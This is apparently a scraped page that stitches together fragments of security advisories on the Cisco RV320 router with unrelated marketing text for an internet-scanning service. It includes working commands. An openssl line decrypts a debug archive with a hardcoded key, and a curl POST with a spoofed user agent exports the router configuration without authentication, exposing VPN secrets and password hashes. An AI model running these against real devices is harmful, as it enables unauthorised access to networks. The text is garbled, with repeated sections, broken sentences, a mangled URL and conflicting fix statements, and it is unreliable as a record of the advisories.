$ openssl aes-128-cbc -salt -md md5 -d \
  -k 'NKDebug12#$%' < debug > debug.tgz

$ mkdir output && tar -xf debug.tgz -C output/

$ ls -1 output/
debug_messages.txt
etc.tgz
nk_sysconfig
var.tgz

$ cat output/nk_sysconfig

```
### Workaround

Prevent untrusted clients from connecting to the device’s web server.

### Fix

Install firmware version 1.4.2.22 (or later) on the router.

### Security Risk

This vulnerability is rated as a high risk as it exposes sensitive
diagnostic information, such as the device’s configuration, to
untrusted, potentially malicious parties. By retrieving this
information, attackers can obtain internal network configuration, VPN or
IPsec secrets, as well as password hashes for the router’s user
accounts. Knowledge of a user’s password hash is sufficient to log into
the router’s web interface, cracking of the hash is not required. Any
information obtained through exploitation of this vulnerability can be
used to facilitate further compromise of the device itself or attached
networks.

security, and reliability in its network."
(from the Cisco RV320 product page [1])

More Details
============

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface, which is implemented in various CGI programs in
the device's firmware. Access to this web interface requires prior
authentication using a username and password. Previously, RedTeam
Pentesting identified a vulnerability (rt-sa-2018-002) [2] in the CGI
program:

/cgi-bin/config.exp

By issuing an HTTP GET request to this program, it was possible to
export a router's configuration without providing any prior
authentication. This vulnerability was adressed in firmware version
1.4.2.19 published by Cisco [3].

RedTeam Pentesting discovered that the CGI program in the patched
firmware is still vulnerable. By performing a specially crafted HTTP
POST request, attackers are still able to download the router's
configuration. The user agent "curl" is blacklisted by the firmware and
must be adjusted in the HTTP client. Again, exploitation does not
require any authentication.

Proof of Concept
================

A device's configuration can be retrieved by issuing an HTTP POST request
to the vulnerable CGI program (output shortened):

------------------------------------------------------------------------
$ curl -s -k -A kurl -X POST --data 'submitbkconfig=0' \
  '[https://192.168.1.1/cgi-bin/config.exp'](https://192.168.1.1/cgi-bin/config.exp%26apos);

Workaround
==========

Prevent untrusted clients from connecting to the device's web server.

Fix
===

None

Security Risk
=============

This vulnerability is rated as a high risk as it exposes the device's
configuration to untrusted, potentially malicious parties. By
downloading the configuration, attackers can obtain internal network
configuration, VPN or IPsec secrets, as well as password hashes for the
router's user accounts. Knowledge of a user's password hash is
sufficient to log into the router's web interface, cracking of the hash
is not required. Any information obtained through exploitation of this
vulnerability can be used to facilitate further compromise of the device
itself or attached networks.

### Introduction

“Keep your employees, your business, and yourself productive and
effective. The Cisco RV320 Dual Gigabit WAN VPN Router is an ideal
choice for any small office or small business looking for performance,
security, and reliability in its network.”
(from the Cisco RV320 product page (<https://www.cisco.com/c/en/us/products/routers/rv320-dual-gigabit-wan-vpn-router/index.html>))

### More Details

The Cisco RV320 Dual Gigabit WAN VPN Router provides a web-based
configuration interface, which is implemented in various CGI programs in
the device’s firmware. Access to this web interface requires prior
authentication using a username and password. Previously, RedTeam
Pentesting identified a vulnerability (rt-sa-2018-002) (<https://www.redteam-pentesting.de/advisories/rt-sa-2018-002>) in the CGI

### Workaround

Prevent untrusted clients from connecting to the device’s web server.

Install firmware version 1.4.2.22 (or later) on the router.

### Security Risk

This vulnerability is rated as a high risk as it exposes the device’s

# We for you!

### We scan the entire public internet, create real-time threat intelligence streams, and reports that show the exposure of what is connected to the Internet. What is your Internet Attack Surface?

# Intelligent Security

### Be Ready.

Organisations currently own a large number of internet exposed assets, some of them they are not even aware
exist.

Everyday, more and more companies expose their servers and services to the internet, increasing the attack
surface that can be targeted by hackers.

Today's rapidly expanding universe of sensors, cloud, remote access, and IoT devices has created high
levels of complexity that are impossible to secure without constant monitoring, both from within and outside
the organizations networks

# Our Data

We have built a distributed platform of scanners and honeypots, to acquire, classify and correlate
different types of data.

We use all of these datapoints to match those digital assets to an organization, allowing us to provide a
global, up-to-date, view of organizations known and unknown assets.
